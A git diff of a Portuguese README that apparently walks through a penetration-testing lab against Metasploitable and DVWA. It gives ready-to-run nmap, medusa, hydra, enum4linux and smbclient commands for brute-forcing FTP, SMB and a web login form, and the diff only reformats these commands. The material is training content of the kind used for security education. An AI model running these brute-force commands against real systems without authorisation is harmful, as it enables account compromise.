@@ -42,16 +42,16 @@ teste a conexão com a máquina do metasploitable usando ping
 ## Ataque de brute force no FTP do metasploitable
 use o nmap para enumeração de serviços, versões disponíveis e limite as varreduras para as portas 21,22,80,445,139
 
-> nmap -sV -p 21,22,80,445,139 < IP alvo >
+`nmap -sV -p 21,22,80,445,139 <IP alvo>`
 
 💡 **Sugestão:** caso o nmap esteja demorando para processar as informações. Isso pode acontecer devido a resolução de DNS, caso isso aconteça, adicione o parâmetro "-n" no comando do nmap
 
-> nmap -sV -n -p 21,22,80,445,139 < IP alvo >
+`nmap -sV -n -p 21,22,80,445,139 <IP alvo>`
 ![Listando os serviços do metasploitable usando nmap](Images/04_Nmap_captura.png)
 
 confirme se o ftp está ativo tentando se conectar a ele
 
-> ftp < IP alvo >
+`ftp <IP alvo>`
 
 ![Teste de conexão FTP](Images/05_Conexao_ftp.png)
 
@@ -63,7 +63,7 @@ crie uma lista com os possíveis nomes do usuário
 + admin
 + root
 
-> echo -e "user\nmsfadmin\nadmin\nroot" > nome_do_arquivo_usuario.txt
+`echo -e "user\nmsfadmin\nadmin\nroot" > nome_do_arquivo_usuario.txt`
 
 crie uma lista com as possíveis senhas
 + 123456
@@ -71,13 +71,13 @@ crie uma lista com as possíveis senhas
 + qwerty
 + msfadmin
 
-> echo -e "123456\npassword\nqwerty\nmsfadmin" > nome_do_arquivo_senha.txt
+`echo -e "123456\npassword\nqwerty\nmsfadmin" > nome_do_arquivo_senha.txt`
 
 ![Arquivos de usuário e senha](Images/06_User_password.png)
 
 use a medusa para fazer um ataque de brute force no ftp do metasploitable
 
-> medusa -h < IP alvo > -U nome_do_arquivo_usuario.txt -P nome_do_arquivo_senha.txt -M < módulo > -t < quantidade de threads >
+`medusa -h <IP alvo> -U nome_do_arquivo_usuario.txt -P nome_do_arquivo_senha.txt -M <módulo> -t <quantidade de threads>`
 
 ![Ataque de brute force no FTP](Images/07_Medusa_ataque.png)
 
@@ -104,7 +104,7 @@ Antes da invasão, precisamos saber como os dados são organizados no formulári
 
 ![Formatação dos dados do formulário](Images/12_Depois_do_network.png)
 
-> hydra -L nome_do_arquivo_usuario.txt -P nome_do_arquivo_senha.txt < IP alvo > http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"
+`hydra -L nome_do_arquivo_usuario.txt -P nome_do_arquivo_senha.txt <IP alvo> http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"`
 
 ![Ataque de brute force usando hydra no FTP](Images/13_Hydra_dvwa_brute_force.png)
 
@@ -128,7 +128,7 @@ Antes da invasão, precisamos saber como os dados são organizados no formulári
 ## Enumeração SMB e password spraying
 Utilize o o enum4linux para coletar informações do sistema
 
-> enum4linux -a < IP alvo > | tee arquivo_saida.txt
+`enum4linux -a <IP alvo> | tee arquivo_saida.txt`
 
 ![Enumerando a vm do metasploitable](Images/16_Enum4linux_enumeração.png)
 
@@ -144,20 +144,20 @@ procure no arquivo os nomes de usuário do sistema, são informações úteis pa
 
 crie uma lista de possíveis senhas e usuários que serão usados para entrar no sistema
 
-> echo -e "user\nmsfadmin\nservice" > arquivo_usuario.txt
+`echo -e "user\nmsfadmin\nservice" > arquivo_usuario.txt`
 
-> echo -e "password\n123456\nWelcome123\nmsfadmin" > arquivo_senha.txt
+`echo -e "password\n123456\nWelcome123\nmsfadmin" > arquivo_senha.txt`
 
 ![Listando os usuários e senha criados para o ataque](Images/19_Enum4linux_senhas.png)
 
 use o medusa para fazer um ataque de brute force no smb
 
-> medusa -h < IP alvo > -U < arquivo_usuario.txt > -P < arquivo_senha.txt > -M < módulo > -t < quantidade de threads > -T < número total de hosts simultâneos >
+`medusa -h < IP alvo > -U <arquivo_usuario.txt> -P <arquivo_senha.txt> -M <módulo> -t <quantidade de threads> -T <número total de hosts simultâneos>`
 
 ![Usando para adquirir a senha do smb](Images/20_Smb_brute_force.png)
 
 teste o usuário e senha se conectando ao cliente smb e listando os diretórios
-> smbclient -L < //IP alvo > -U <usuário>
+`smbclient -L <//IP alvo> -U <usuário>`
 
 ![Testando se o ataque teve suceso](Images/21_Logando_no_smbclient.png)
 
